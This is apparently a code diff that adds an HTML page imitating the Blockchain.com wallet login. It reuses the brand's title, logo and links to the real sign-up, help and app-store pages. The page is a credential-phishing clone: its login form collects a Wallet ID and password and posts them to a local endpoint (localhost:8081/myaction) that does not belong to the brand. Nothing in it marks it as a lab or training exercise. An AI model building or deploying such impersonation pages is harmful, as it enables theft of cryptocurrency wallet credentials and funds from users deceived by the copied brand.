@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <link rel="shortcut icon" type="image/png" href="/favicon.png"/>
+    <link href='https://fonts.googleapis.com/css?family=Arimo' rel='stylesheet'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+    <title>Blockchain Wallet - Exchange Cryptocurrency</title>
+    <style>
+        *{
+            color: white;
+            font-family: "Arial";
+            font-size: 15px;
+        }
+        body{
+            background-color: #0E3578;
+        }
+        .column {
+        float: left;
+        width: 49%;
+        padding-left: 0.8cm;
+        padding-top: 0.5cm;
+        padding-right: 0.7cm;
+        padding-bottom: 1cm;
+        height: 50px;
+        }
+        .column2 {
+        float: left;
+        width: 50%;
+        height: 50px;
+        padding-top: 0.3cm;
+        padding-right: 0.5cm;
+        }
+        .col{
+        float: left;
+        width: 33%;
+        margin-top: 20px;
+        margin-left: 40px;
+        margin-right: 40px;
+        height: 450px;
+        border-radius: 15px;
+        background-color: white;
+        padding-left: 1.1cm;
+        padding-top: 1cm;
+        padding-right: 1.1cm;
+        padding-bottom: 1cm;
+        }
+        .col2{
+        float: left;
+        width: 100%;
+        height: 100px;
+        }
+        .row:after {
+        content: "";
+        display: table;
+        clear: both;
+        }
+        a.white:link, a.white:visited, a.white:hover, a.white:active {
+        text-decoration: none;
+        color: white;
+        }
+        a.blue:link, a.blue:visited, a.blue:hover, a.blue:active {
+        text-decoration: none;
+        font-size: 12px;
+        color:#4f83d3;
+        }
+        a.blueB:link, a.blueB:visited, a.blueB:hover, a.blueB:active {
+        text-decoration: none;
+        font-size: 13px;
+        color:rgb(59, 116, 207);
+        font-weight: 547;
+        padding-top: 0.9cm;
+        }
+        p.welcome{
+            color: #0E3578;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        p.small{
+            font-size: 12px;
+            color: #2f353d;
+            text-align: center;
+            padding-top: 0.15cm;
+        }
+    </style>
+</head>
+<body>
+    <div class="row">
+        <div class="column">
+            <a href="https://www.blockchain.com/">
+            <img src="logo.png" style="width:200px;height:33px;">
+            </a>
+            <br/>
+            <a href="https://github.com/blockchain/blockchain-wallet-v4-frontend/releases">
+                &nbsp;<img src="version.png" style="width:105px;height:20px;">
+            </a>
+        </div>
+        <div class="column2" align="right">
+           <a href="https://login.blockchain.com/#/signup">
+                <img src="signup.png" style="width:305px;height:55px;padding-left: 10px;">
+            </a>
+        </div>
+    </div>
+    <br/>
+    <div class="row">
+        <div style="float: left;width: 31%;"><p></p></div>
+        <div class="col">
+            <p class="welcome">Welcome Back!</p>
+            <form action="http://localhost:8081/myaction" method="post">
+                <div class="form-group">
+                    <label style="color: #2e3521; font-weight: 520;" for="id">Wallet ID</label>
+                    <input type="text" size="10" class="form-control form-control-lg" id="id" name="id">
+                    <p class="small">
+                        Your Wallet ID can be found at the bottom of any email we’ve ever <br/>
+                        sent you. Need a reminder?
+                        <a class="blue" href="https://login.blockchain.com/en/#/reminder">Send my Wallet ID</a>
+                    </p>
+                </div>
+                <div class="form-group">
+                        <label style="color: #2e3521; font-weight: 520;" for="id">Password</label>
+                        <input type="password" size="10" class="form-control form-control-lg" id="pass" name="pass">
+                </div>
+                <button type="submit" class="btn btn-primary btn-lg btn-block" style="
+                background-color: hsl(216, 70%, 59%);
+                margin-top: 0.8cm;
+                margin-bottom: 0.5cm;
+                font-size: 16px;
+                padding: 15px;
+                ">Log In</button>
+            </form>
+            <a class="blueB" href="https://login.blockchain.com/en/#/mobile-login">Login via Mobile</a>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <a class="blueB" href="https://login.blockchain.com/en/#/help">Need some help?</a>
+        </div>
+        <div style="float: left;width: 31%;"><p></p></div>
+    </div>
+    <div class="row" align="center">
+        <div style="float: left;width: 26%;"><p></p></div>
+        <div style="float: left;width: 20%;margin-top: 5px;">
+            <P style="font-weight: regular; padding-top: 0.4cm;">English ˅</P>
+        </div>
+        <div style="float: left; width: 24%; margin-top: 20px;">
+            &nbsp;&nbsp;
+            <a class="white" href="https://www.blockchain.com/explorer">Data</a> &nbsp;&nbsp;
+            <a class="white" href="https://www.blockchain.com/about">About</a> &nbsp;&nbsp;
+            <a class="white" href="https://blog.blockchain.com/">Blog</a> &nbsp;&nbsp;
+            <a class="white" href="https://support.blockchain.com/hc/en-us">Support</a>
+        </div>
+        <div style="float: left;width: 20%;"><p></p></div>
+    </div>
+    <div class="row">
+        <div style="float: left;width: 35%;"><p></p></div>
+        <div style="float: left;width: 30%;" align="center">
+            <br/>
+            <a href="https://apps.apple.com/us/app/blockchain-bitcoin-wallet/id493253309" target="_blank"/>
+                <img src="apple.png" style="width:145px;height:50px;">
+
+            <a href="https://play.google.com/store/apps/details?id=piuk.blockchain.android" target="_blank"/>
+                <img src="google.png" style="width:170px;height:50px;padding-left:20px;">
+        </div>
+        <div style="float: left;width: 20%;"><p></p></div>
+    </div>
+
+</body>
+</html>
